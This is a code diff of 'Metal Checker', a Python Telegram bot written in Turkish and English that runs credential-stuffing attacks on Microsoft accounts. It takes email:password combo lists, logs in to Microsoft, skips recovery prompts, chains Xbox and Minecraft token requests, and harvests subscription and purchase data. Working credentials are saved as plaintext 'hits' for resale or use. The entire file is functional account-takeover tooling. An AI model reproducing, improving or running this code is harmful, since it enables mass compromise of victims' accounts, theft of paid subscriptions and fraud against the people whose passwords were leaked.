@@ -6,8 +6,6 @@ import json
 import threading
 import concurrent.futures
 import io
-import sys
-import logging
 from datetime import datetime
 import requests
 import urllib3
@@ -17,192 +15,76 @@ from telebot import types
 from requests.adapters import HTTPAdapter
 from urllib3.util import Retry
 
-# ==============================================================================
-# ⚙️ DETAILED LOGGING ENGINE & SYSTEM CONFIGURATION
-# ==============================================================================
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s [%(levelname)s] (%(threadName)s) %(message)s',
-    handlers=[
-        logging.StreamHandler(sys.stdout)
-    ]
-)
-logger = logging.getLogger("MetalCheckerPro")
-
+# ==========================================
+# ⚙️ INITIAL SETTINGS & WARNINGS
+# ==========================================
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))
 
-bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
-database_lock = threading.Lock()
+# En kararlı bot tanımı
+bot = telebot.TeleBot(BOT_TOKEN)
+panel_lock = threading.Lock()
 
+# Ağ kopmalarına karşı en katı istek koruması
 session_tg = requests.Session()
-retries = Retry(total=7, backoff_factor=1.5, status_forcelist=[429, 500, 502, 503, 504])
+retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
 session_tg.mount("https://", HTTPAdapter(max_retries=retries))
 
 def safe_bot_call(func, *args, **kwargs):
-    """Telebot çağrılarını sarmalayan hata geçirmez koruma kalkanı"""
     try:
         return func(*args, **kwargs)
-    except telebot.apihelper.ApiTelegramException as e:
-        logger.error(f"[Telegram API Exception]: {e.description} (Code: {e.error_code})")
-        if e.error_code == 409:
-            logger.critical("CONFLICT DETECTED! Diğer bot instance'ını kapatın.")
-        return None
     except Exception as e:
-        logger.error(f"[Genel Bot Çağrı Hatası]: {e}")
+        print(f"[⚠️ TELEGRAM API HATASI]: {e}")
         return None
 
-# ==============================================================================
-# 💾 DATABASE MANAGEMENT MIGRATION ENGINE
-# ==============================================================================
+# ==========================================
+# 💾 DATABASE / STORAGE EMULATION
+# ==========================================
 DATA_FILE = "bot_data.json"
-
-def initialize_database():
-    with database_lock:
-        if os.path.exists(DATA_FILE):
-            try:
-                with open(DATA_FILE, "r", encoding="utf-8") as f:
-                    data = json.load(f)
-                    for key in ["admins", "users", "keys", "channels", "stats_global"]:
-                        if key not in data:
-                            data[key] = [] if isinstance(data.get(key), list) else {}
-                    return data
-            except Exception as e:
-                logger.error(f"Veritabanı okuma hatası, sıfırlanıyor: {e}")
-        
-        return {
-            "admins": [OWNER_ID],
-            "users": {},
-            "keys": {},
-            "channels": [],
-            "stats_global": {
-                "total_checked_accounts": 0,
-                "total_hits_found": 0,
-                "total_bad_accounts": 0,
-                "total_2fa_accounts": 0
-            }
-        }
-
-db = initialize_database()
+if os.path.exists(DATA_FILE):
+    with open(DATA_FILE, "r", encoding="utf-8") as f:
+        db = json.load(f)
+else:
+    db = {"admins": [OWNER_ID], "users": {}, "keys": {}, "channels": []}
 
 def save_db():
-    with database_lock:
-        try:
-            with open(DATA_FILE, "w", encoding="utf-8") as f:
-                json.dump(db, f, ensure_ascii=False, indent=4)
-        except Exception as e:
-            logger.error(f"Veritabanı yazma hatası: {e}")
+    with open(DATA_FILE, "w", encoding="utf-8") as f:
+        json.dump(db, f, ensure_ascii=False, indent=4)
 
 if OWNER_ID not in db["admins"]:
     db["admins"].append(OWNER_ID)
     save_db()
 
-# ==============================================================================
-# 🌍 ADVANCED MULTI-LANGUAGE LOCALIZATION SYSTEM
-# ==============================================================================
+# ==========================================
+# 🌍 LOCALIZATION & KEYBOARDS
+# ==========================================
 LANG = {
     "tr": {
-        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!*\n\nLütfen devam etmek için bir dil seçin / Please choose a language to continue:",
-        "main_menu": "📱 *Ana Menü*\n\nLütfen yapmak istediğiniz işlemi aşağıdaki menüden seçiniz:",
+        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin:",
+        "main_menu": "📱 *Ana Menü* \n\nBir işlem seçiniz:",
         "btn_check": "🚀 Hesap Tara (.txt)",
         "btn_merge": "📂 Dosya Birleştir",
         "btn_stats": "📊 İstatistiklerim",
         "btn_lang": "🌐 Dil Değiştir (Language)",
-        "scan_started": "🚀 *Tarama arka planda başarıyla başlatıldı!*\n\n⚠️ İstediğiniz zaman /stats yazarak veya ana menüden *📊 İstatistiklerim* butonuna basarak taramanın anlık canlı durumunu raporlayabilirsiniz.",
-        "filter_prompt": "🔍 Aranacak spesifik bir oyun adı (Örn: *Minecraft*, *Sea of Thieves*) girin veya filtreleme yapmadan geçmek için aşağıdaki *skip* butonuna basın:",
-        "invalid_file": "❌ Lütfen geçerli bir `.txt` uzantılı combo liste dosyası gönderiniz.",
-        "no_combo_found": "❌ Gönderilen dosya içerisinde geçerli formatta (email:şifre) hesap bulunamadı.",
-        "already_scanning": "⚠️ Halihazırda devam eden bir tarama işleminiz bulunuyor. Lütfen bitmesini bekleyin veya /stop komutu ile durdurun.",
-        "scan_stopped": "🛑 Devam eden tarama işleminiz kullanıcı isteği doğrultusunda durduruldu.",
-        "no_active_scan": "❌ Şu anda aktif bir tarama işleminiz bulunmaktaymaktadır.",
-        "merge_prompt": "📂 Lütfen birleştirmek istediğiniz `.txt` dosyalarını tek tek bota gönderin. Gönderim işlemi bittiğinde /done yazarak birleştirilmiş temiz dosyanızı alın.",
-        "merge_success": "✅ Toplam {count} adet benzersiz (de-duplicate) hesap başarıyla birleştirildi ve temizlendi!",
-        "stats_title": "📊 *ANLIK TARAMA DURUMUNUZ* 📊",
-        "sub_gp_ultimate": "💎 Game Pass Ultimate",
-        "sub_gp_pc": "💻 Game Pass PC",
-        "sub_gp_essential": "🟢 Game Pass Core (Essential)",
-        "sub_gp_standard": "🎮 Game Pass Standard",
-        "sub_gp_core": "⚙️ Xbox Live Gold / Core",
-        "sub_minecraft": "🟩 Minecraft Java / Capes",
-        "sub_m365_family": "📦 Microsoft 365 Aile",
-        "sub_m365_personal": "👤 Microsoft 365 Bireysel",
-        "sub_m365_business": "🏢 Microsoft 365 İş",
-        "sub_onedrive": "☁️ OneDrive Depolama",
-        "sub_clipchamp": "🎬 Clipchamp Premium",
-        "sub_eaplay": "🎮 EA Play Üyeliği",
-        "sub_ubisoft": "🦅 Ubisoft+ Aboneliği",
-        "sub_riot": "🔥 Riot Games Avantajları",
-        "sub_gta": "🚗 GTA+ Üyeliği",
-        "sub_fallout": "☢️ Fallout 1st",
-        "sub_vstudio": "💻 Visual Studio Aboneliği",
-        "sub_azure": "🚀 Azure Kredileri",
-        "sub_copilot": "🤖 GitHub Copilot",
-        "sub_dev": "🛠️ Xbox Geliştirici Hesabı",
-        "sub_realms": "🧱 Minecraft Realms",
-        "sub_win365": "🖥️ Windows 365 Bulut PC",
-        "sub_casual": "🎲 Casual Games Premium",
-        "stat_hit": "🟢 Hit (Oyunlu/Abonelikli)",
-        "stat_bad": "🔴 Hatalı (Bad)",
-        "stat_2fa": "🟡 İki Faktörlü Korumalı (2FA)",
-        "stat_error": "⚠️ Recheck Aşımı/Sistem Hatası",
-        "stat_progress": "📈 İlerleme Durumu",
-        "scan_completed_msg": "📦 *Tarama işleminiz başarıyla tamamlandı!* Sonuç dosyalarınız aşağıda hazırlanmıştır:"
+        "scan_started": "🚀 Tarama başlatıldı! Canlı panel anlık olarak akacaktır.",
     },
     "en": {
-        "welcome": "👋 *Welcome to Metal Checker Bot!*\n\nPlease choose a language to continue / Lütfen devam etmek için bir dil seçin:",
-        "main_menu": "📱 *Main Menu*\n\nPlease choose an option from the menu below:",
+        "welcome": "👋 *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue:",
+        "main_menu": "📱 *Main Menu* \n\nPlease choose an option:",
         "btn_check": "🚀 Scan Accounts (.txt)",
         "btn_merge": "📂 Merge Files",
         "btn_stats": "📊 My Statistics",
         "btn_lang": "🌐 Change Language",
-        "scan_started": "🚀 *Scan successfully started in the background!*\n\n⚠️ You can report the instant live status of the scan at any time by typing /stats or clicking the *📊 My Statistics* button in the main menu.",
-        "filter_prompt": "🔍 Enter a specific game name to search for (e.g., *Minecraft*, *Sea of Thieves*) or press the *skip* button below to proceed without filtering:",
-        "invalid_file": "❌ Please send a valid combo list file with a `.txt` extension.",
-        "no_combo_found": "❌ No accounts found in the valid format (email:password) inside the sent file.",
-        "already_scanning": "⚠️ You already have an active scan running. Please wait for it to finish or stop it using the /stop command.",
-        "scan_stopped": "🛑 Your ongoing scanning process has been stopped by user request.",
-        "no_active_scan": "❌ You do not have an active scanning process at the moment.",
-        "merge_prompt": "📂 Please send the `.txt` files you want to merge to the bot one by one. When done, type /done to receive your clean merged file.",
-        "merge_success": "✅ A total of {count} unique (de-duplicated) accounts were successfully merged and cleaned!",
-        "stats_title": "📊 *YOUR INSTANT LIVE SCAN STATUS* 📊",
-        "sub_gp_ultimate": "💎 Game Pass Ultimate",
-        "sub_gp_pc": "💻 Game Pass PC",
-        "sub_gp_essential": "🟢 Game Pass Core (Essential)",
-        "sub_gp_standard": "🎮 Game Pass Standard",
-        "sub_gp_core": "⚙️ Xbox Live Gold / Core",
-        "sub_minecraft": "🟩 Minecraft Java / Capes",
-        "sub_m365_family": "📦 Microsoft 365 Family",
-        "sub_m365_personal": "👤 Microsoft 365 Personal",
-        "sub_m365_business": "🏢 Microsoft 365 Business",
-        "sub_onedrive": "☁️ OneDrive Storage",
-        "sub_clipchamp": "🎬 Clipchamp Premium",
-        "sub_eaplay": "🎮 EA Play Membership",
-        "sub_ubisoft": "🦅 Ubisoft+ Subscription",
-        "sub_riot": "🔥 Riot Games Perks",
-        "sub_gta": "🚗 GTA+ Membership",
-        "sub_fallout": "☢️ Fallout 1st",
-        "sub_vstudio": "💻 Visual Studio Subscription",
-        "sub_azure": "🚀 Azure Credits",
-        "sub_copilot": "🤖 GitHub Copilot",
-        "sub_dev": "🛠️ Xbox Developer Account",
-        "sub_realms": "🧱 Minecraft Realms",
-        "sub_win365": "🖥️ Windows 365 Cloud PC",
-        "sub_casual": "🎲 Casual Games Premium",
-        "stat_hit": "🟢 Hit (With Game/Sub)",
-        "stat_bad": "🔴 Bad Accounts",
-        "stat_2fa": "🟡 Two-Factor Auth (2FA)",
-        "stat_error": "⚠️ Recheck Limit/Network Error",
-        "stat_progress": "📈 Progress Status",
-        "scan_completed_msg": "📦 *Your scan has been successfully completed!* Your result files have been prepared below:"
+        "scan_started": "🚀 Scan started! Dashboard is updating live.",
     }
 }
 
 def get_text(user_id, key):
     lang = db["users"].get(str(user_id), {}).get("lang", "en")
-    return LANG[lang].get(key, LANG["en"].get(key, key))
+    return LANG[lang].get(key, key)
 
 def lang_keyboard():
     markup = types.InlineKeyboardMarkup()
@@ -216,9 +98,9 @@ def main_keyboard(user_id):
     markup.row(get_text(user_id, "btn_stats"), get_text(user_id, "btn_lang"))
     return markup
 
-# ==============================================================================
-# 🧠 MICROSOFT & XBOX CORE AUTH AUTOMATION PIPELINE
-# ==============================================================================
+# ==========================================
+# 🧠 MICROSOFT & XBOX CORE AUTH ENGINE
+# ==========================================
 SFTAG_URL = (
     "https://login.live.com/oauth20_authorize.srf"
     "?client_id=00000000402B5328"
@@ -227,39 +109,26 @@ SFTAG_URL = (
     "&display=touch&response_type=token&locale=en"
 )
 
-CORE_HEADERS = {
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.9",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
-}
-
 def get_sftag(session):
     try:
-        response = session.get(SFTAG_URL, headers=CORE_HEADERS, timeout=12)
+        response = session.get(SFTAG_URL, timeout=10)
         text     = response.text
         match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
         if match:
             sftag = match.group(1)
             match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
-            if match: 
-                return match.group(1), sftag
-    except Exception as e:
-        logger.debug(f"sftag parsing error: {e}")
+            if match: return match.group(1), sftag
+    except: pass
     return None, None
 
 def microsoft_auth(session, email, password, url_post, sftag):
     try:
         data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
-        headers = dict(CORE_HEADERS, **{'Content-Type': 'application/x-www-form-urlencoded'})
-        
-        login_request = session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=12)
-        
+        login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
         if '#' in login_request.url and login_request.url != SFTAG_URL:
             from urllib.parse import urlparse, parse_qs
             token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-            if token != "None": 
-                return token, "success"
-                
+            if token != "None": return token, "success"
         elif 'cancel?mkt=' in login_request.text:
             try:
                 d = {
@@ -268,66 +137,49 @@ def microsoft_auth(session, email, password, url_post, sftag):
                     'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                 }
                 action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
-                ret        = session.post(action_url, data=d, allow_redirects=True, timeout=12)
+                ret        = session.post(action_url, data=d, allow_redirects=True, timeout=10)
                 return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
-                fin        = session.get(return_url, allow_redirects=True, timeout=12)
+                fin        = session.get(return_url, allow_redirects=True, timeout=10)
                 token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
-                if token != "None": 
-                    return token, "success"
-            except Exception as inner_ex:
-                logger.debug(f"Arka kapı iptal bypass hatası: {inner_ex}")
-                
+                if token != "None": return token, "success"
+            except: pass
         elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
             return None, "2fa"
         elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
             return None, "bad"
-    except Exception as e:
-        logger.debug(f"Microsoft auth exception: {e}")
+    except: pass
     return None, "error"
 
 def get_xbox_token(session, ms_token):
     try:
-        payload  = {
-            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
-            "RelyingParty": "http://auth.xboxlive.com",
-            "TokenType": "JWT"
-        }
-        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=12)
+        payload  = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
         if response.status_code == 200:
             data = response.json()
             return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
-    except Exception as e:
-        logger.debug(f"Xbox token fetch error: {e}")
+    except: pass
     return None, None
 
 def get_xsts_token(session, xbox_token):
     try:
-        payload  = {
-            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
-            "RelyingParty": "rp://api.minecraftservices.com/",
-            "TokenType": "JWT"
-        }
-        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=12)
-        if response.status_code == 200: 
-            return response.json().get('Token')
-    except Exception as e:
-        logger.debug(f"XSTS token error: {e}")
+        payload  = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
+        if response.status_code == 200: return response.json().get('Token')
+    except: pass
     return None
 
 def get_minecraft_token(session, uhs, xsts_token):
     try:
-        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=12)
-        if response.status_code == 200: 
-            return response.json().get('access_token')
-    except Exception as e:
-        logger.debug(f"Minecraft token error: {e}")
+        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
+        if response.status_code == 200: return response.json().get('access_token')
+    except: pass
     return None
 
 def check_entitlements(session, mc_token):
     found_subs = []
     main_type = None
     try:
-        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=12)
+        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
         if response.status_code == 200:
             text = response.text
             text_lower = text.lower()
@@ -338,7 +190,7 @@ def check_entitlements(session, mc_token):
                 try:
                     exp_raw = expiry_match.group(1).split("t")[0]
                     diff = (datetime.strptime(exp_raw, "%Y-%m-%d") - datetime.now()).days
-                    days_left_str = f" ({diff}D Left)" if diff > 0 else " (Expired)"
+                    days_left_str = f" ({diff}G Kaldı)" if diff > 0 else " (Süresi Bitmiş)"
                 except: pass
 
             if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
@@ -348,7 +200,7 @@ def check_entitlements(session, mc_token):
             elif 'core' in text_lower or 'xbox_live_gold' in text_lower: found_subs.append(f"Game Pass Core⚙️{days_left_str}")
             
             if 'family' in text_lower: found_subs.append("Microsoft 365 Family")
-            if 'personal' in text_lower: found_subs.append("Microsoft 365 Personal")
+            if 'personal' in text_lower or 'bireysel' in text_lower: found_subs.append("Microsoft 365 Personal")
             if 'business' in text_lower: found_subs.append("Microsoft 365 Business")
             if 'onedrive' in text_lower: found_subs.append("OneDrive Storage")
             if 'clipchamp' in text_lower: found_subs.append("Clipchamp Premium")
@@ -368,45 +220,36 @@ def check_entitlements(session, mc_token):
             if 'product_game_pass_ultimate' in text: main_type = 'Xbox Game Pass Ultimate'
             elif 'product_game_pass_pc' in text: main_type = 'Xbox Game Pass'
             elif '"product_minecraft"' in text: main_type = 'Minecraft'
-    except Exception as e:
-        logger.debug(f"Entitlements query error: {e}")
+    except: pass
     return main_type, found_subs
 
 def get_xbox_profile(session, uhs, xsts_token):
     try:
-        response = session.get(
-            "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier", 
-            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}, 
-            timeout=12
-        )
+        response = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier", headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
         if response.status_code == 200:
             settings = {s["id"]: s.get("value", "N/A") for s in response.json().get("profileUsers", [{}])[0].get("settings", [])}
             return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
-    except Exception as e:
-        logger.debug(f"Xbox profile parsing error: {e}")
+    except: pass
     return {"gamertag": "N/A", "tier": "N/A"}
 
 def get_payment_transactions(session, ms_token):
     try:
         url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
-        response = session.get(url, headers={"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}, timeout=12)
+        response = session.get(url, headers={"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}, timeout=10)
         if response.status_code == 200:
             games = []
             for item in response.json().get("transactions", []):
                 title = item.get("description") or item.get("productName")
-                if title: 
-                    games.append(title)
+                if title: games.append(title)
             return list(set(games))
-    except Exception as e:
-        logger.debug(f"Transaction logging error: {e}")
+    except: pass
     return []
 
-# ==============================================================================
-# 🔄 CONTEXT STATE MANAGEMENT 
-# ==============================================================================
+# ==========================================
+# 🔄 CONTEXT STATE MANAGEMENT
+# ==========================================
 active_scans = {}
 user_game_filter = {}
-user_merge_files = {}
 
 class BotScanContext:
     def __init__(self, chat_id, user_id, combos, filter_str="skip"):
@@ -420,6 +263,7 @@ class BotScanContext:
         self.twofa = 0
         self.errors = 0
 
+        # Canlı Panel Sayaç Odaları
         self.gp_ultimate = 0
         self.gp_pc = 0
         self.gp_essential = 0
@@ -454,101 +298,48 @@ class BotScanContext:
         self.filter_str = filter_str.lower().strip()
         self.is_running = True
         self.lock = threading.Lock()
-
-# ==============================================================================
-# 🛡️ UNPRECEDENTED ULTIMATE RECHECK CORE ENGINE
-# ==============================================================================
-def execute_armored_check(email, password):
-    """
-    Dünyanın en stabil ve hataya dirençli recheck mekanizması.
-    Ağ hatalarında veya 502/503 kilitlenmelerinde Exponential Backoff kullanarak 4 kere dener.
-    """
-    max_retries = 4
-    backoff_delay = 2
-
-    for attempt in range(1, max_retries + 1):
-        try:
-            session = requests.Session()
-            session.verify = False
-            session.headers.update(CORE_HEADERS)
-
-            url_post, sftag = get_sftag(session)
-            if not url_post or not sftag:
-                raise Exception("SftagExtractionFailed")
-
-            ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
-            
-            if auth_status == "2fa":
-                return "2fa", None, None, None, None
-            elif auth_status == "bad":
-                return "bad", None, None, None, None
-            elif auth_status == "error" or not ms_token:
-                raise Exception("MicrosoftHandshakeError")
-
-            xbox_token, uhs = get_xbox_token(session, ms_token)
-            if not xbox_token or not uhs: 
-                raise Exception("XboxAuthError")
-
-            xsts_token = get_xsts_token(session, xbox_token)
-            if not xsts_token: 
-                raise Exception("XstsTokenError")
-
-            xbox_profile = get_xbox_profile(session, uhs, xsts_token)
-            mc_token = get_minecraft_token(session, uhs, xsts_token)
-            if not mc_token: 
-                raise Exception("MinecraftAuthError")
-
-            account_type, subs = check_entitlements(session, mc_token)
-            purchased_games = get_payment_transactions(session, ms_token)
-
-            return "success", xbox_profile, subs, purchased_games, account_type
-
-        except Exception as retry_exception:
-            logger.warning(f"[RECHECK ALERT] {email} için Deneme {attempt}/{max_retries} Başarısız: {retry_exception}")
-            if attempt < max_retries:
-                time.sleep(backoff_delay)
-                backoff_delay *= 2  # Katlanarak bekleme süresini artır ($2, 4, 8$ saniye)
-            else:
-                return "error", None, None, None, None
+        self.message_id = None
 
 def check_account_bot(context, combo):
-    if not context.is_running: 
-        return
+    if not context.is_running: return
     try:
         parts = combo.strip().split(':')
         if len(parts) < 2:
-            with context.lock: 
-                context.bad += 1
-                context.checked += 1
+            with context.lock: context.bad += 1; context.checked += 1
             return
 
         email, password = parts[0], ':'.join(parts[1:])
-        
-        # Zırhlı recheck fonksiyonumuzu çağırıyoruz
-        status, xbox_profile, subs, purchased_games, account_type = execute_armored_check(email, password)
+        session = requests.Session()
+        session.verify = False
 
-        if status == "2fa":
-            with context.lock: 
-                context.twofa += 1
-                context.checked += 1
-                context.twofa_list.append(combo)
+        url_post, sftag = get_sftag(session)
+        if not url_post or not sftag: raise Exception("sftag")
+
+        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
+        if auth_status == "2fa":
+            with context.lock: context.twofa += 1; context.checked += 1; context.twofa_list.append(combo)
             return
-        elif status == "bad":
-            with context.lock: 
-                context.bad += 1
-                context.checked += 1
-                context.bad_list.append(combo)
+        elif auth_status == "bad":
+            with context.lock: context.bad += 1; context.checked += 1; context.bad_list.append(combo)
             return
-        elif status == "error":
-            with context.lock:
-                context.errors += 1
-                context.checked += 1
-            return
+        elif auth_status != "success" or not ms_token: raise Exception("ms")
+
+        xbox_token, uhs = get_xbox_token(session, ms_token)
+        if not xbox_token or not uhs: raise Exception("xbox")
+
+        xsts_token = get_xsts_token(session, xbox_token)
+        if not xsts_token: raise Exception("xsts")
+
+        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
+        mc_token = get_minecraft_token(session, uhs, xsts_token)
+        if not mc_token: raise Exception("mc")
+
+        account_type, subs = check_entitlements(session, mc_token)
+        purchased_games = get_payment_transactions(session, ms_token)
 
         if context.filter_str != "skip":
             if not any(context.filter_str in g.lower() for g in purchased_games):
-                with context.lock: 
-                    context.checked += 1
+                with context.lock: context.checked += 1
                 return
 
         has_premium_sub = len(subs) > 0
@@ -568,16 +359,17 @@ def check_account_bot(context, combo):
                 context.hits += 1
                 context.hit_list.append(f"{email}:{password}")
                 
+                # Sadece oyunu olanlar purchased_items'a
                 if has_any_game:
                     games_str = "\n".join([f"{i} - {g}" for i, g in enumerate(purchased_games, 1)])
                     context.purchased_items_list.append(f"Email: {email}\nPassword: {password}\nGamesList:\n{games_str}\n— Checker by Icardi\n{'='*50}\n")
 
+                # Sadece aboneliği olanlar Subscriptions'a
                 if has_premium_sub:
                     sub_entry = f"Email: {email} | Pass: {password}\nActive Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + f"\n{'-'*40}\n"
                     context.subscriptions_list.append(sub_entry)
 
-            if account_type and 'Minecraft' in account_type: 
-                context.minecraft_java += 1
+            if account_type and 'Minecraft' in account_type: context.minecraft_java += 1
             for s in subs:
                 sl = s.lower()
                 if "ultimate" in sl: context.gp_ultimate += 1
@@ -602,232 +394,180 @@ def check_account_bot(context, combo):
                 elif "realms" in sl: context.realms += 1
                 elif "windows 365" in sl: context.win355 += 1
                 elif "casual" in sl: context.casual += 1
-    except Exception as e:
-        logger.debug(f"Critical exception in thread router: {e}")
-        with context.lock: 
-            context.errors += 1
-            context.checked += 1
+    except:
+        with context.lock: context.errors += 1; context.checked += 1
 
 def generate_panel_text(context):
-    uid = context.user_id
     pct = (context.checked / context.total) * 100 if context.total > 0 else 0
     return (
-        f"⚡ *METAL CHECKER ANLIK PANEL v6.5* ⚡\n"
+        f"⚡ *METAL CHECKER ANLIK PANEL v5.0* ⚡\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"*{get_text(uid, 'stat_hit')}*: `{context.hits}`\n"
-        f"*{get_text(uid, 'stat_bad')}*: `{context.bad}`\n"
-        f"*{get_text(uid, 'stat_2fa')}*: `{context.twofa}`\n"
-        f"*{get_text(uid, 'stat_error')}*: `{context.errors}`\n"
+        f"🟢 Hit (Oyun/Sub'lı): `{context.hits}`\n"
+        f"🔴 Hatalı (Bad): `{context.bad}`\n"
+        f"🟡 İki Faktör (2FA): `{context.twofa}`\n"
+        f"⚠️ Hata (Error): `{context.errors}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 *{get_text(uid, 'stats_title')}* 📊\n"
-        f"{get_text(uid, 'sub_gp_ultimate')}: `{context.gp_ultimate}`\n"
-        f"{get_text(uid, 'sub_gp_pc')}: `{context.gp_pc}`\n"
-        f"{get_text(uid, 'sub_gp_essential')}: `{context.gp_essential}`\n"
-        f"{get_text(uid, 'sub_gp_standard')}: `{context.gp_standard}`\n"
-        f"{get_text(uid, 'sub_gp_core')}: `{context.gp_core}`\n"
-        f"{get_text(uid, 'sub_minecraft')}: `{context.minecraft_java}`\n"
-        f"{get_text(uid, 'sub_m365_family')}: `{context.m365_family}`\n"
-        f"{get_text(uid, 'sub_m365_personal')}: `{context.m365_personal}`\n"
-        f"{get_text(uid, 'sub_m365_business')}: `{context.m365_business}`\n"
-        f"{get_text(uid, 'sub_onedrive')}: `{context.onedrive}`\n"
-        f"{get_text(uid, 'sub_clipchamp')}: `{context.clipchamp}`\n"
-        f"{get_text(uid, 'sub_eaplay')}: `{context.eaplay}`\n"
-        f"{get_text(uid, 'sub_ubisoft')}: `{context.ubisoft}`\n"
-        f"{get_text(uid, 'sub_riot')}: `{context.riot}`\n"
-        f"{get_text(uid, 'sub_gta')}: `{context.gta}`\n"
-        f"{get_text(uid, 'sub_fallout')}: `{context.fallout}`\n"
-        f"{get_text(uid, 'sub_vstudio')}: `{context.vstudio}`\n"
-        f"{get_text(uid, 'sub_azure')}: `{context.azure}`\n"
-        f"{get_text(uid, 'sub_copilot')}: `{context.copilot}`\n"
-        f"{get_text(uid, 'sub_dev')}: `{context.dev_acc}`\n"
-        f"{get_text(uid, 'sub_realms')}: `{context.realms}`\n"
-        f"{get_text(uid, 'sub_win365')}: `{context.win355}`\n"
-        f"{get_text(uid, 'sub_casual')}: `{context.casual}`\n"
+        f"📊 *ANLIK ABONELİK & OYUN DETAYLARI* 📊\n"
+        f"💎 Game Pass Ultimate: `{context.gp_ultimate}`\n"
+        f"💻 Game Pass PC: `{context.gp_pc}`\n"
+        f"🟢 Game Pass Essential: `{context.gp_essential}`\n"
+        f"🎮 Game Pass Standard: `{context.gp_standard}`\n"
+        f"⚙️ Game Pass Core/Gold: `{context.gp_core}`\n"
+        f"🟩 Minecraft Java/Capes: `{context.minecraft_java}`\n"
+        f"📦 Microsoft 365 Family: `{context.m365_family}`\n"
+        f"👤 Microsoft 365 Personal: `{context.m365_personal}`\n"
+        f"🏢 Microsoft 365 Business: `{context.m365_business}`\n"
+        f"☁️ OneDrive Storage: `{context.onedrive}`\n"
+        f"🎬 Clipchamp Premium: `{context.clipchamp}`\n"
+        f"🎮 EA Play: `{context.eaplay}`\n"
+        f"🦅 Ubisoft+: `{context.ubisoft}`\n"
+        f"🔥 Riot Games Perks: `{context.riot}`\n"
+        f"🚗 GTA+: `{context.gta}`\n"
+        f"☢️ Fallout 1st: `{context.fallout}`\n"
+        f"💻 Visual Studio Sub: `{context.vstudio}`\n"
+        f"🚀 Azure Credits: `{context.azure}`\n"
+        f"🤖 GitHub Copilot: `{context.copilot}`\n"
